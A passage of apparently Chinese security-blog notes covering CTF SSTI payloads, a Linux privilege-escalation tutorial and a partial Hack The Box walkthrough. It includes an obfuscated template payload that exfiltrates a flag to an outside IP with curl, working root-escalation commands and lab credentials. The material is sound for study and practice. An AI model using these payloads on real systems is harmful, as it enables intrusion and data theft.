cmd=chr(９５)%2bchr(９５)%2bchr(１０５)%2bchr(１０９)%2bchr(１１２)%2bchr(１１１)%2bchr(１１４)%2bchr(１１６)%2bchr(９５)%2bchr(９５)%2bchr(４０)%2bchr(３４)%2bchr(１１１)%2bchr(１１５)%2bchr(３４)%2bchr(４１)%2bchr(４６)%2bchr(１１２)%2bchr(１１１)%2bchr(１１２)%2bchr(１０１)%2bchr(１１０)%2bchr(４０)%2bchr(３４)%2bchr(９９)%2bchr(１１７)%2bchr(１１４)%2bchr(１０８)%2bchr(３２)%2bchr(１０４)%2bchr(１１６)%2bchr(１１６)%2bchr(１１２)%2bchr(５８)%2bchr(４７)%2bchr(４７)%2bchr(５６)%2bchr(４９)%2bchr(４６)%2bchr(５５)%2bchr(４９)%2bchr(４６)%2bchr(４９)%2bchr(５１)%2bchr(４６)%2bchr(５５)%2bchr(５４)%2bchr(５８)%2bchr(５３)%2bchr(５３)%2bchr(５３)%2bchr(５３)%2bchr(６３)%2bchr(１１２)%2bchr(６１)%2bchr(９６)%2bchr(９９)%2bchr(９７)%2bchr(１１６)%2bchr(３２)%2bchr(４７)%2bchr(１０２)%2bchr(１０８)%2bchr(９７)%2bchr(１０３)%2bchr(９６)%2bchr(３４)%2bchr(４１)%2bchr(４６)%2bchr(１１４)%2bchr(１０１)%2bchr(９７)%2bchr(１００)%2bchr(４０)%2bchr(４１)%}{%if x.eval(cmd)%}abc{%endif%} web372_(count)用上一题的将数字变成全角的payload照样可以， 补充baby flask12345'.','[','\\'','&quot;',''\\\\','+',':','_',&lt;/br&gt; 'chr','pop','class','base','mro','init','globals','get',&lt;/br&gt; 'eval','exec','os','popen','open','read',&lt;/br&gt; 'select','url_for','get_flashed_messages','config','request',&lt;/br&gt; 'count','length','０','１','２','３','４','５','６','７','８','９','0','1','2','3','4','5','6','7','8','9' 这道题的特点是过滤了数字和cont和length，怎么得到数字呢？ 123456789101112131415161718{% set test=(()|select|string|list)%}{% print(test) %}输出如下：['&lt;', 'g', 'e', 'n', 'e', 'r', 'a', 't', 'o', 'r', ' ', 'o', 'b', 'j', 'e', 'c', 't', ' ', 's', 'e', 'l', 'e', 'c', 't', '_', 'o', 'r', '_', 'r', 'e', 'j', 'e', 'c', 't', ' ', 'a', 't', ' ', '0', 'x', '7', 'f', '5', 'c', '7', 'b', '5', 'b', '9', 'b', 'a', '0', '&gt;']{% set test=(()|select|string|list).index('e')%}{% print(test) %}输出如下：2为什么是2呢？其实index('e')就是表示e在列表中的索引，问题又来了，想要得到值100或1000，想要得到更大的值怎么办呢，可以用运算符号比如输出如下{% set test=(()|select|string|list).index('e')%}{% print(test*test) %}输出如下：4 贴一下wp 12345678910111213141516171819202122{% set id=dict(ind=a,ex=a)|join%}{% set pp=dict(po=a,p=a)|join%}{% set ls=dict(ls=a)|join%}{% set ppe=dict(po=a,pen=a)|join%}{% set gt=dict(ge=a,t=a)|join%}{% set cr=dict(ch=a,r=a)|join%}{% set nn=dict(n=a)|join%}{% set tt=dict(t=a)|join%}{% set ff=dict(f=a)|join%}{% set ooqq=dict(o=a,s=a)|join %}{% set rd=dict(re=a,ad=a)|join%}{% set five=(lipsum|string|list)|attr(id)(tt) %}{% set three=(lipsum|string|list)|attr(id)(nn) %}{% set one=(lipsum|string|list)|attr(id)(ff) %}{% set shiba=five*five-three-three-one %}{% set xiahuaxian=(lipsum|string|list)|attr(pp)(shiba) %}{% set gb=(xiahuaxian,xiahuaxian,dict(glob=a,als=a)|join,xiahuaxian,xiahuaxian)|join %}{% set bin=(xiahuaxian,xiahuaxian,dict(builtins=a)|join,xiahuaxian,xiahuaxian)|join %}{% set chcr=(lipsum|attr(gb))|attr(gt)(bin)|attr(gt)(cr) %}{% set xiegang=chcr(three*five*five-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one)%}{% set space=chcr(three*three*five-five-five-three) %}{% set shell=(ls,space,xiegang,dict(var=a)|join,xiegang,dict(www=a)|join,xiegang,dict(flask=a)|join)|join %}{{(lipsum|attr(gb))|attr(gt)(ooqq)|attr(ppe)(shell)|attr(rd)()}}","link":"/2023/11/10/SSTI%E6%BC%8F%E6%B4%9E/"},{"title":"Linux提权总结","text":"前言记录一些常见的非漏洞(配置不当)提权笔记；还有一些linux内核版本可能会产生漏洞需要自行google. suid提权 只对可执行文件生效，任何用户执行该文件都是以文件所属者身份运行的。 SUID（Set User ID）是一种权限位，用于在执行文件时暂时将进程的有效用户 ID 更改为文件所有者的用户 ID。它是一种特殊权限设置，可让非特权用户以超级用户权限运行具有 SUID 标志的可执行文件。 查找具有s权限的二进制文件 1find / -perm -u=s -type f 2&gt;/dev/null find做一个实验使得find命令有s权限，来提权、 12345678910111213141516171819202122┌──(kali㉿kali)-[~]└─$ whoamikali┌──(kali㉿kali)-[~]└─$ which find/usr/bin/find┌──(kali㉿kali)-[~]└─$ ls -l /usr/bin/find-rwxr-xr-x 1 root root 224848 7月 2日 13:26 /usr/bin/find┌──(kali㉿kali)-[~]└─$ sudo chmod u+s /usr/bin/find┌──(kali㉿kali)-[~]└─$ ls -l /usr/bin/find-rwsr-xr-x 1 root root 224848 7月 2日 13:26 /usr/bin/find#由rwx变成了rws┌──(kali㉿kali)-[~]└─$ find /etc/passwd -exec &quot;whoami&quot; \\;root cp做一个实验使得cp命令有s权限，来提权、当然不止于find,cp命令，可以参考这个网址：click me 当cp有suid权限时，可以改写只能root访问的文件，比如/etc/passwd或/etc/shadow中的内容 首先用openssl生成一个密码，passwd参数表示生成一个密码，-1表示md5,-salk表示盐(随意指定)，最后跟要加密的值 12└─$ openssl passwd -1 -salt 1 123abc $1$1$dzqAUU/vB2clNL4EHnbXq0 然后往/etc/passwd文件中添加一个新用户，用户名随意取，密码不要用x,要用我们上面生成的密码，其他的按照root的写即可 123456789101112131415161718┌──(kali㉿kali)-[~/桌面]└─$ sudo chmod u+s /usr/bin/cp ┌──(kali㉿kali)-[~/桌面]└─$ ls -l /usr/bin/cp -rwsr-xr-x 1 root root 151152 2022年 9月20日 /usr/bin/cp ┌──(kali㉿kali)-[~/桌面]└─$ cp /etc/passwd ./ ┌──(kali㉿kali)-[~/桌面]└─$ vim passwd #在最后添加一行:test:$1$1$dzqAUU/vB2clNL4EHnbXq0:0:0:root:/root:/usr/bin/zsh┌──(kali㉿kali)-[~/桌面]└─$ cp ./passwd /etc/passwd ┌──(kali㉿kali)-[~/桌面]└─$ su test 密码： #这里输入之前openssl加密的 '123abc'┌──(root㉿kali)-[/home/kali/桌面]└─# #提权成功 去修改/etc/sudoers应该简单点 补充一下linux的shadow文件中的第二个字段保存了加密后的密码，加密数据的格式为 $type$salt$encrypted，其中type是提示符，salt是随机生成的字符串，encrypted是明文密码和salt通过crypt函数加密后的结果。在加密数据中的提示符type用来标识采用了哪种加密方式，这样的标识符有以下几种： 1 代表采用了MD5加密方式2 Blowfish，是最早的版本，有一些缺陷，不推荐使用2a Blowfish，是修复了一些缺陷后的版本，但仍然有一些问题，不推荐使用2b Blowfish，是修复了2a中的问题后的版本，是安全、常用的版本2y Blowfish，Eksblowfish版本y 是Yescrypt加密方式的前缀，是Blowfish加密方式的一个变种，提供了更高的安全性和性能5 代表采用了SHA256加密方式6 代表采用了SHA512加密方式 在线哈希识别器：click me /etc/shadow中的密码可以用john工具(kali自带)破解，能不能破解成功取决于你的dict。 123456789101112131415161718192021222324252627┌──(kali㉿kali)-[~/桌面]└─$ echo &quot;\\$1\\$1\\$dzqAUU/vB2clNL4EHnbXq0&quot; &gt; hash┌──(kali㉿kali)-[~/桌面]└─$ john hash --wordlist=/usr/share/wordlists/rockyou.txtWarning: detected hash type &quot;md5crypt&quot;, but the string is also recognized as &quot;md5crypt-long&quot;Use the &quot;--format=md5crypt-long&quot; option to force loading these as that type insteadUsing default input encoding: UTF-8Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])Will run 4 OpenMP threadsPress 'q' or Ctrl-C to abort, almost any other key for status123abc (?) #这里成功破解出密码为'123abc'1g 0:00:00:00 DONE (2023-12-05 12:53) 50.00g/s 19200p/s 19200c/s 19200C/s 123456..michael1Use the &quot;--show&quot; option to display all of the cracked passwords reliablySession completed. #这里需要说明一下，john不会破解之前已经破解过的密文，可以使用命令查看之前破解的密文方法一┌──(kali㉿kali)-[~/桌面]└─$ cat /home/kali/.john/john.pot$1$1$dzqAUU/vB2clNL4EHnbXq0:123abc方法二┌──(kali㉿kali)-[~/桌面]└─$ john --show hash ?:123abc 当然john还有很多用法,比如破解受密码保护的Zip压缩文件，我不一一记录; 可以参考 官方Wiki 再docker中su username,可能会报must be run from terminal;解决方案：clink me 用的比较多的解决方案： 1python3 -c &quot;import pty; pty.spawn('/bin/bash')&quot; sudo提权sudo提权基本离不开/etc/sudoers文件， /etc/sudoers文件是一个用于配置sudo命令的文件，它定义了哪些用户或用户组有权利以root用户的权限来执行特定的命令。这个文件通常位于Linux系统中的/etc目录下。sudoers文件的内容可以指定哪些用户可以以root用户的权限执行哪些命令，以及是否需要输入密码等安全设置。编辑sudoers文件需要特殊的权限，并且通常使用visudo命令来进行编辑，以确保在保存文件时能够检查语法错误，以避免导致系统安全性问题。 假如我们（root用户）要给普通用户test分配sudo权限，请输出vim /etc/sudoers打开文件进行编辑，找到root权限root ALL=(ALL:ALL) ALL，在下一行输入test ALL(ALL:ALL) NOPASSWD:ALL，保存后退出，这样即表示用户test可以使用sudo调用root权限执行命令。 /etc/sudoers也可以指定用户执行指定的sudo命令 test ALL(ALL:ALL) /usr/bin/ls,但是这样还是得输入密码才能执行，也可以配置不需要密码：test ALL(ALL:ALL) NOPASSWD:/usr/bin/ls, 在Vim中，当你输入:!/bin/bash并按下回车时，Vim会执行你输入的命令，其中!表示执行外部命令的意思。因此，Vim会启动一个新的shell进程并执行/bin/bash。这是Vim的一个功能，允许用户在编辑器中执行外部命令,当然vim，只是sudo提权命令之一，还有很多其他的命令，比如：less,python等等，可以参考上面那个网站 12345678910111213141516171819202122232425262728293031┌──(kali㉿kali)-[~/桌面]└─$ sudo vim /etc/sudoers#添加zixyd ALL=(ALL:ALL) NOPASSWD:/usr/bin/less# wp!保存退出┌──(zixyd㉿kali)-[/home/kali/桌面]└─$ sudo -ll匹配 kali 上 zixyd 的默认条目： env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, use_pty用户 zixyd 可以在 kali 上运行以下命令：Sudoers 条目： RunAs 用户：ALL RunAs 组：ALL 选项：!authenticate 命令： /usr/bin/less#切换到zixyd用户┌──(zixyd㉿kali)-[/home/kali/桌面]└─$ sudo less /etc/passwd#直接输入!/bin/bash#提权成功┌──(root㉿kali)-[/home/kali/桌面]└─# 再试试python,在/etc/sudoers中添加zixyd ALL=(ALL:ALL) NOPASSWD:/usr/bin/less,/usr/bin/python, 12345┌──(zixyd㉿kali)-[/home/kali/桌面]└─$ sudo python -c &quot;import os;os.system('/bin/sh')&quot;# whoami root NFS提权NFS是network file system缩写，网络文件系统，用来挂在某个目录或文件进行共享，默认是2049端口，功能类似于windows的共享。 首先安装nfs服务端： 1sudo apt-get install nfs-kernel-server 安装后修改配置文件/etc/exports，这里将home目录进行挂载共享，内容如下： 1/home *(rw,no_root_squash) 其中/home是要挂载的目录，*代表允许连接的主机，这里是所有，rw是读写权限，no_root_squash代表客户端允许以root权限访问nfs。 随后重启相关服务： 123# nfs通过rpc通信，这里把rpcbind也重启下sudo /etc/init.d/rpcbind restartsudo /etc/init.d/nfs-kernel-server restart 此时就配置好了，可以通过showmount命令来列出目标机的共享目录，e参数显示NFS服务器的输出清单。 1showmount -e ip NFS配置不当可提权 当nfs配置了读写权限，且允许客户端以root访问时，就会存在安全隐患。测试如下： 首先客户端把目标机nfs的共享挂载到本地，然后把bash复制进去并赋予suid权限，操作如下图。 此时目标机的home目录下就会有一个具有suid权限的bash。 普通用户执行即可获取root权限，这里注意需要加上p参数，否则权限还是当前用户的。 p参数说明：不提供的情况下，打开bash权限是当前实际用户，提供的情况下，会打开特权模式，像上继承euid，因为bash有suid权限，所以这里是root。 使用场景：这个和suid提权很像，给程序赋予suid权限然后利用。不同的是前两篇suid提权是当前用户使用sudo chmod自己修改的，在sudoers禁用sudo命令等情况下，就行不通了。而nfs配置利用，是客户端挂载到本地赋权的，目标机的普通用户只需执行就可以。 其它命令 除了可以直接得到shell的，还有其他一些程序不能直接获取，例如nano、vi等。 例如nano被共享了，则可以给nano一个suid权限，然后来读取敏感文件，爆破密码从而登录。 PATH提权Linux中的PATH是一个环境变量，它指定了可执行程序所在的目录，例如bin和sbin目录，当我们在终端运行一个命令时，系统就会根据PATH来查找相关的可执行文件。 首先编译以下c代码，这里用whoami命令来做实验,gcc shell.c -o whoami_shell 123456789#include&lt;unistd.h&gt;#include&lt;stdlib.h&gt;int main(){ setuid(0); setgid(0); system(&quot;whoami&quot;); return 0;} 12345678910111213141516171819202122┌──(kali㉿kali)-[~/桌面]└─$ gcc ./shell.c -o whoami_shell ┌──(kali㉿kali)-[~/桌面]└─$ ls -l ./whoami_shell-rwxr-xr-x 1 kali kali 16056 12月 7日 19:19 ./whoami_shell┌──(kali㉿kali)-[~/桌面]└─$ ./whoami_shell kali┌──(kali㉿kali)-[~/桌面]└─$ sudo chown root ./whoami_shell #改变所有者为root ┌──(kali㉿kali)-[~/桌面]└─$ ll whoami_shell -rwxr-xr-x 1 root kali 16056 12月 7日 19:19 whoami_shell┌──(kali㉿kali)-[~/桌面]└─$ sudo chmod u+s ./whoami_shell ┌──(kali㉿kali)-[~/桌面]└─$ ./whoami_shellroot 利用：到tmp目录下，把bash写到一个whoami文件中，然后修改PATH变量添加tmp目录，再去执行shell，就会获得一个root权限。 1234567891011121314151617181920212223242526272829┌──(kali㉿kali)-[~/桌面]└─$ cd /tmp ┌──(kali㉿kali)-[/tmp]└─$ echo &quot;/bin/bash&quot; &gt; whoami┌──(kali㉿kali)-[/tmp]└─$ ls whoami┌──(kali㉿kali)-[/tmp]└─$ echo $PATH /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games:/bin:/usr/local/go/bin┌──(kali㉿kali)-[/tmp]└─$ export PATH=/tmp:$PATH┌──(kali㉿kali)-[/tmp]└─$ echo $PATH /tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games:/bin:/usr/local/go/bin┌──(kali㉿kali)-[~/桌面]└─$ chmod +x /tmp/whoami #还要给可执行权限┌──(kali㉿kali)-[~/桌面]└─$ ./whoami_shell ┌──(root㉿kali)-[~/桌面]└─# 过程：root给一个可执行文件赋予了suid，而此文件又调用了一个环境变量的命令，这时修改PATH把tmp添加到头的位置，系统再执行就会先去tmp目录下找，tmp目录下放的是恶意程序，从而导致恶意程序以root权限运行。 注意，用export PATH=/tmp:$PATH改变PATH只在此次终端才有效，对其他终端无效 LD_PRELOAD提权LD_PRELOAD是Linux下的一个环境变量，程序运行时都会加载一些so文件，类似于windows下程序加载dll，而LD_PRELOAD可以指定程序运行前加载的动态连接库。 测试前先按如下配置一下sudoers文件，以zixyd用户为例，添加一个find命令和一个LD_PRELOAD。 123zixyd ALL=(ALL:ALL) NOPASSWD:/usr/bin/findDefaults env_keep += LD_PRELOAD 这里记录下env_keep的说明。 例如aaa用户有一个aaa_pach的环境变量，当通过su切换到bbb用户时，再查看env环境变量，aaa_pach就没有了，也就意味着用户的切换不会带着环境变量一块切过去。而想保持某个环境不受用户切换的影响，那么可以在sudoers文件中设置env_keep。 如果并设置Defaults env_keep += LD_PRELOAD,会报错 123┌──(zixyd㉿kali)-[~]└─$ sudo LD_PRELOAD=ld_preload_shell_test find sudo: 对不起，您无权设置以下环境变量：LD_PRELOAD 切换回普通用户，查看sudo权限。 1234567┌──(zixyd㉿kali)-[~]└─$ sudo -l 匹配 kali 上 zixyd 的默认条目： env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, env_keep+=LD_PRELOAD, use_pty用户 zixyd 可以在 kali 上运行以下命令： (ALL : ALL) NOPASSWD: /usr/bin/find 我们有一个find的sudo权，且env_keep中定义了LD_PRELOAD，那么我们就可以定义一个恶意的so文件，然后sudo运行find时指定LD_PRELOAD来加载我们自己的so文件，就可以实现提权。 so文件的c代码如下。 12345678910#include &lt;unistd.h&gt;#include &lt;stdio.h&gt;#include &lt;sys/types.h&gt;#include &lt;stdlib.h&gt;void _init() { unsetenv(&quot;LD_PRELOAD&quot;); setgid(0); setuid(0); system(&quot;/bin/bash&quot;);} 然后进行编译-fPIC -shared参数简单理解就是动态编辑共享库，可以进行公共调用，nostartfiles参数代表该库运行不会去调用系统的其它库，避免影响自己的程序执行。 1gcc ld_preload_shell.c -fPIC -shared -o shell.so -nostartfiles 编译后我们使用sudo运行find并指定LD_PRELOAD为我们编译的shell.so文件，这时find就会先调用shell.so，导致我们的代码被执行，返回的权限为root。 1234┌──(zixyd㉿kali)-[~]└─$ sudo LD_PRELOAD=/home/zixyd/shell.so find #似乎只能用绝对路径，系统默认的共享库目录（比如/lib和/usr/lib） ┌──(root㉿kali)-[/home/zixyd]└─# 思考： 再sudo提权时可以用到LD_PRELOAD，那么suid行不行呢？我用suid没有成功 123456789┌──(zixyd㉿kali)-[~]└─$ ll /usr/bin/cp-rwsr-xr-x 1 root root 151152 2022年 9月20日 /usr/bin/cp┌──(zixyd㉿kali)-[~]└─$ LD_PRELOAD=/home/zixyd/shell.so cp /etc/passwd ./┌──(zixyd㉿kali)-[~] #并没有切换到root└─$ 注意点：如果使用自己攻击机编译的so文件，传到目标机可能普通用户没有执行权限，这时需要加下权限。如果目标机支持gcc编译，也可以直接在目标机编译。 总结 使用情况就是sudoers中的env_keep定义了LD_PRELOAD，然后sudo有相关的命令，那么sudo运行命令时就可以通过LD_PRELOAD来指定恶意so文件。 cronjobs提权cronjobs是定时任务，在特定的日期和时间执行计划任务。例如定期备份或者定期清理某个目录等都会用到，定义格式如下： 文件覆盖这里以root用户创建一下测试环境，首先创建一个cron，运行一个脚本，该脚本功能是定时清除特定文件，例如/tmp/test。 12┌──(kali㉿kali)-[~/桌面]└─$ echo &quot;just_test&quot; &gt; /tmp/test 创建clear.py脚本，并赋可执行权限chmod +x /tmp/clear.py 12345678#!/usr/bin/env python3import osimport systry: os.system(&quot;rm -rf /tmp/test&quot;)except: sys.exit() 修改crontab 文件，每分钟以root身份执行一次/tmp/clear.py文件 123sudo vim /etc/crontab */1 * * * * root /tmp/clear.py 提权： 如果可以修改定时任务的文件(clear.py)，就可以提权，例如将上面的**/tmp/clear.py**修改内容如下 123456789#!/usr/bin/env python3import osimport systry: os.system(&quot;rm -rf /tmp/test&quot;) os.system(&quot;chmod u+s /bin/bash&quot;)except: sys.exit() 在执行/bin/bash -p命令即可得到root权限，-p参数在本文章上面有解释； 通配符注入而在操作过程中，如果有文件名的名字是一个参数，那么执行过程中，就会被当作参数运行。例如一个目录下有一个叫–help的文件，当cat查看该文件内容时，实际上确是cat的帮助信息。 常见的定时任务除了定时清除文件外，定时压缩也会很常见，例如有一个定时任务，每分钟回去执行/var/www/html/crontab.sh脚本，该脚本是备份html网站，脚本内容如下。 123#!/bin/bashcd /var/www/html/tar -zvcf /var/backups/html.tar * 修改/etc/crontab： 1*/1 * * * * root /var/www/html/crontab.sh 查看是否备份成功 1234567┌──(kali㉿kali)-[/var/backups]└─$ cd /var/backups ┌──(kali㉿kali)-[/var/backups]└─$ ll总计 4-rw-r--r-- 1 root root 3621 12月 8日 09:52 html.tar 在tar命令中有一个checkpoint参数，即检查点，比如checkpoint=1，则代表压缩过程中每压缩一个文件就去执行一个检查操作。 而这个检查操作的参数是--checkpoint-action=exec=，后面可以跟要执行的命令。 利用思路就是我们写入一个sh脚本，该脚本作用是修改sudoers文件，把当前用户添加进去，获得sudo所有权，从而进行提权。然后利用checkpoint-action=exec=接一个执行sh脚本的命令即可。 利用过程：首先创建两个文件，名字为参数名，然后再创建一个sh脚本，内容为向sudoers追加权限，相关命令如下： 123echo 'echo &quot;zixyd ALL=(root) NOPASSWD: ALL&quot; &gt;&gt; /etc/sudoers' &gt; test.shecho &quot;&quot; &gt; --checkpoint=1echo &quot;&quot; &gt; &quot;--checkpoint-action=exec=sh test.sh&quot; 等待一分钟后，sudoers就会被追加zixyd用户的权限 123456sudo cat /etc/sudoers#每分钟 都会往/etc/sudoers添加一句zixyd ALL=(root) NOPASSWD: ALLzixyd ALL=(root) NOPASSWD: ALLzixyd ALL=(root) NOPASSWD: ALLzixyd ALL=(root) NOPASSWD: ALL docker提权在docker中，是允许访问root用户和docker组中的其它用户的，测试如下,(这句话表达的不是很清楚，大概意思就是只要用户在docker组下，就可以未授权访问root用户和docker组中的其他用户) 需要将用户添加到docker组中 1usermod -G docker kali 这里有意思的是，我没有输入这条命令，我在我的kali用户已经是dockr组了(意思就是我没有设置实验环境，我的kali机器已经存在可以提权的点了) 上网找原因：在某些Linux系统中，安装Docker后会自动创建一个名为”docker”的用户组，并将当前用户加入该组，以便用户可以在不使用sudo的情况下运行Docker命令。这通常是Docker安装过程中的默认行为。 1234567┌──(kali㉿kali)-[~/桌面]└─$ groups kalikali : kali adm dialout cdrom floppy sudo audio dip video plugdev users netdev wireshark bluetooth scanner kaboxer docker┌──(kali㉿kali)-[~/桌面]└─$ cat /etc/group | grep &quot;docker&quot; docker:x:993:kali 随后使用docker run来允许alpine镜像，v参数进行挂载，是将宿主机的root目录挂载到alpine的mnt下，使用冒号分隔。i参数是保持打开状态，t参数是分配一个tty终端，it一般结合使用，即保持通讯终端的打开。 这时访问docker镜像alpine，就相当于访问宿主机的root目录，权限变成了root,可以执行任意命令 12345┌──(kali㉿kali)-[~/桌面]└─$ docker run -v /root:/mnt -it alpine / # cd /mnt/mnt # whoamiroot capability提权capability翻译为能力的意思，linux中能力的概念和suid类似，是用来让普通用户也可以做超级用户的工作，从而设置的一个机制，原来linux分的是普通用户和超级用户，后来加了能力，即赋予某某账号能力，这个账号有能力了，就可以去做事了。 capability可分割root权限，把root特权分割成不同的能力，然后给与普通用户不同的能力，每一种能力都代表着一种特权。下面是一些能力参考： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657- CAP_CHOWN:修改文件属主的权限- CAP_DAC_OVERRIDE:忽略文件的DAC访问限制- CAP_DAC_READ_SEARCH:忽略文件读及目录搜索的DAC访问限制- CAP_FOWNER：忽略文件属主ID必须和进程用户ID相匹配的限制- CAP_FSETID:允许设置文件的setuid位- CAP_KILL:允许对不属于自己的进程发送信号- CAP_SETGID:允许改变进程的组ID- CAP_SETUID:允许改变进程的用户ID- CAP_SETPCAP:允许向其他进程转移能力以及删除其他进程的能力- CAP_LINUX_IMMUTABLE:允许修改文件的IMMUTABLE和APPEND属性标志- CAP_NET_BIND_SERVICE:允许绑定到小于1024的端口- CAP_NET_BROADCAST:允许网络广播和多播访问- CAP_NET_ADMIN:允许执行网络管理任务- CAP_NET_RAW:允许使用原始套接字- CAP_IPC_LOCK:允许锁定共享内存片段- CAP_IPC_OWNER:忽略IPC所有权检查- CAP_SYS_MODULE:允许插入和删除内核模块- CAP_SYS_RAWIO:允许直接访问/devport,/dev/mem,/dev/kmem及原始块设备- CAP_SYS_CHROOT:允许使用chroot()系统调用- CAP_SYS_PTRACE:允许跟踪任何进程- CAP_SYS_PACCT:允许执行进程的BSD式审计- CAP_SYS_ADMIN:允许执行系统管理任务，如加载或卸载文件系统、设置磁盘配额等- CAP_SYS_BOOT:允许重新启动系统- CAP_SYS_NICE:允许提升优先级及设置其他进程的优先级- CAP_SYS_RESOURCE:忽略资源限制- CAP_SYS_TIME:允许改变系统时钟- CAP_SYS_TTY_CONFIG:允许配置TTY设备- CAP_MKNOD:允许使用mknod()系统调用- CAP_LEASE:允许修改文件锁的FL_LEASE标志 在设置程序能力时，有三个选项可选： 1，inheritable，简称i，表示是否可继承。 2，permitted，简称p，表示是否允许使用。 3，effective，简称e，表示特权是否有效。 setcap命令用来设置能力，例如setcap cap_setuid+ep /home/demo/python3，就表示home/demo/python3这个程序添加了setuid能力，即改变进程uid的能力，+ep就表示能力有效，且允许使用。 capability测试 setcap设置能力，getcat读取能力。 getcap通过r参数来读取指定目录下有能力的程序。 123456789┌──(kali㉿kali)-[/tmp]└─$ echo &quot;capability&quot; &gt; capability ┌──(kali㉿kali)-[/tmp]└─$ sudo setcap cap_setuid+ep /tmp/capability┌──(kali㉿kali)-[/tmp]└─$ getcap -r /tmp 2&gt;/dev/null /tmp/capability cap_setuid=ep 能力滥用导致的提权 例如管理员要为python3程序(其他程序类似)设置超级权限给zixyd用户，但没有用suid或sudo授权，而用的是capabilities，通过的是以下命令来设置的。 因为root只想给zixyd用户的python3能力，所以这里是将程序复制到了zixyd用户下，如果直接设置bin下的python3程序，那么意味着任何用户都具有了相关能力 1234567891011121314151617181920┌──(zixyd㉿kali)-[~]└─$ cp /usr/bin/python3 .┌──(zixyd㉿kali)-[~]└─$ sudo setcap cap_setuid+ep ./python3┌──(zixyd㉿kali)-[~]└─$ ls -l-rwxr-xr-x 1 root zixyd 6754136 12月 8日 13:19 python3┌──(zixyd㉿kali)-[~]└─$ getcap -r ./ 2&gt;/dev/null./python3 cap_setuid=ep┌──(zixyd㉿kali)-[~]└─$ ./python3 -c &quot;import os; os.setuid(0); os.system('/bin/bash')&quot;┌──(root㉿kali)-[~]└─# whoamiroot","link":"/2023/12/07/Linux%E6%8F%90%E6%9D%83/"},{"title":"Devvortex(HTB)","text":"信息搜集80端口123456789sudo nmap -p- -sT --min-rate 5000 10.10.11.242Nmap scan report for devvortex.htb (10.10.11.242)Host is up (0.36s latency).Not shown: 64138 closed tcp ports (conn-refused), 1395 filtered tcp ports (no-response)PORT STATE SERVICE22/tcp open ssh80/tcp open httpNmap done: 1 IP address (1 host up) scanned in 77.24 seconds 访问http://10.10.11.242 得到http://devvortex.htb/,添加到/etc/hosts中 子域名寻找一番过后没有找到利用点，尝试信息搜集 1ffuf -u http://devvortex.htb -H &quot;Host: FUZZ.devvortex.htb&quot; -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -fc 302 将http://dev.devvortex.htb/添加到hosts文件，信息搜集，得到后台地址，Joomla cms CVE-2023-237521http://dev.devvortex.htb/administrator/ searchsploit Joomla扫出一堆漏洞，最终确定为CVE-2023-23752 1Joomla! v4.2.8 - Unauthenticated information disclosure |php/webapps/51334.py 发现两个用户，得到用户为lewis的密码为P4ntherg0t1n5r3c0n## 123456789101112131415161718192021└─$ ./51334.py http://dev.devvortex.htb Users[649] lewis (lewis) - lewis@devvortex.htb - Super Users[650] logan paul (logan) - logan@devvortex.htb - RegisteredSite infoSite name: DevelopmentEditor: tinymceCaptcha: 0Access: 1Debug status: falseDatabase infoDB type: mysqliDB host: localhostDB user: lewisDB password: P4ntherg0t1n5r3c0n##DB name: joomlaDB prefix: sd4fg_DB encryption 0 www-datawebshell连接ssh失败后，使用账号密码进入后台，发现可以修改‎/templates/cassiopeia/error.php,写入反弹shell，再访问这个文件，即可getwebshell,但是时www-data用户， 123456789101112┌──(kali㉿kali)-[/usr/…/exploitdb/exploits/php/webapps]└─$ nc -lnnp 5555Linux devvortex 5.4.0-167-generic #184-Ubuntu SMP Tue Oct 31 09:21:49 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux 07:17:27 up 58 min, 3 users, load average: 0.00, 0.02, 0.03USER TTY FROM LOGIN@ IDLE JCPU PCPU WHATlogan pts/1 10.10.14.26 07:06 9:51 0.05s 0.05s -bashlogan pts/2 10.10.14.26 07:10 5:48 0.05s 0.05s -bashlogan pts/3 10.10.14.26 07:15 1:42 0.04s 0.04s -bashuid=33(www-data) gid=33(www-data) groups=33(www-data)sh: 0: can't access tty; job control turned off$ whoamiwww-data 数据库登陆数据库，寻找logan用户的密码 1234567891011mysql -h localhost -u lewis -pEnter password: P4ntherg0t1n5r3c0n##mysql&gt; select username,password from sd4fg_users;select username,password from sd4fg_users;+----------+--------------------------------------------------------------+| username | password |+----------+--------------------------------------------------------------+| lewis | $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u || logan | $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12 |+----------+--------------------------------------------------------------+ john爆破密码将logan的密码写入到hash文件，利用john工具爆破，得到密码：tequieromucho 1234567891011┌──(kali㉿kali)-[~/桌面]└─$ john hash --wordlist=/usr/share/wordlists/rockyou.txtUsing default input encoding: UTF-8Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])Cost 1 (iteration count) is 1024 for all loaded hashesWill run 4 OpenMP threadsPress 'q' or Ctrl-C to abort, almost any other key for statustequieromucho (?) 1g 0:00:00:07 DONE (2023-12-08 15:35) 0.1254g/s 176.1p/s 176.1c/s 176.1C/s lacoste..harryUse the &quot;--show&quot; option to display all of the cracked passwords reliablySession completed. su logan切换到logan是遇到一个问题，需要升级shell才能成功切换用户； 再docker中su username,可能会报must be run from terminal;解决方案：clink me 用的比较多的解决方案： 1python3 -c &quot;import pty; pty.spawn('/bin/bash')&quot; logan登陆成功后sudo -l，发现可以执行/usr/bin/apport-cli 1234567891011logan@devvortex:/$ sudo -lsudo -l[sudo] password for logan: tequieromuchoMatching Defaults entries for logan on devvortex: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser logan may run the following commands on devvortex: (ALL : 